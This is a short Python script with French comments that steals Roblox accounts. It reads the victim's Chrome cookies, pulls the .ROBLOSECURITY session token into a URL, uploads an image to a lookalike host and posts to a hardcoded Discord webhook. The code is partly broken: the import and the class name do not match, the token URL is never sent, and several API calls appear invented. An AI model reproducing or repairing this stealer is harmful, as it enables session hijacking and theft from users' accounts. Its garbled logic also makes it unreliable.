import requests
from browser_cookie3 import chrome
from robloxapi import Client
from discordwebhook import discordwebhook

# Récupérer les cookies du navigateur
cookies = chrome()

# Créer une instance de Client Roblox
client = Client(cookies=cookies)

# Récupérer l'utilisateur actuel
user = client.get_user_from_cookies()

# Récupérer le .ROBLOSECURITY de l'utilisateur
security_token = client.get_cookies()['.ROBLOSECURITY']

# Générer l'URL
url = f"https://www.roblox.com/users/{user['userId']}/profile?securityToken={security_token}"

# Envoyer une requête POST à cdndiscordapp.com pour obtenir une URL d'image
response = requests.post('https://api.cdndiscordapp.com/v0/images', files={'file': open('image.png', 'rb')})

# Extraire l'URL d'image de la réponse
image_url = response.json()['data']['url']

# Créer un webhook Discord avec l'URL de l'image
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1073273422987149322/JQy6ONrYYmyjw09acIDNyIMj2kVeck4YaFNrt1uf3sPfl82hfObnl5rbuKaEtkTf5zeP', content=image_url)

# Envoyer le message Discord
webhook.execute()